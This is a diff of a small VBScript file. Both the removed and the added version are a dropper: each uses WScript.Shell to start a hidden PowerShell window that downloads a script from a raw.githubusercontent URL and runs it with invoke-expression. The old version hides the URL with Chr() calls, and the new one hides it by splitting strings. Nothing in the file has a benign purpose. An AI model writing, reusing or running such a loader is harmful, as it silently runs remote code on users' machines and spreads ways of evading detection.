@@ -1,8 +1,10 @@
 Option Explicit
-Dim a, b, u, s
-Set a = CreateObject("WScript.Shell")
-u = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47) & "raw.githubusercontent" & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & "k53xupn43" & Chr(47) & "i965652f" & Chr(47) & "refs" & Chr(47) & "heads" & Chr(47) & "main" & Chr(47) & "m.ps1"
-s = Chr(36) & "a=" & "IWR " & "'" & u & "';invoke-expression " & Chr(36) & "a"
-b = "powershell.exe -c """ & s & """"
-a.Run b, 0, True
-Set a = Nothing
+
+Dim a1, a2, a3
+
+Set a1 = CreateObject("WScript.Shell")
+
+a2 = "powershell.exe -c ""$a3 = iwr h"+"t"+"tp://r"+"aw.g"+"ithubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1?dl=1; invoke-expression $a3"""
+a1.Run a2, 0, True
+
+Set a1 = Nothing
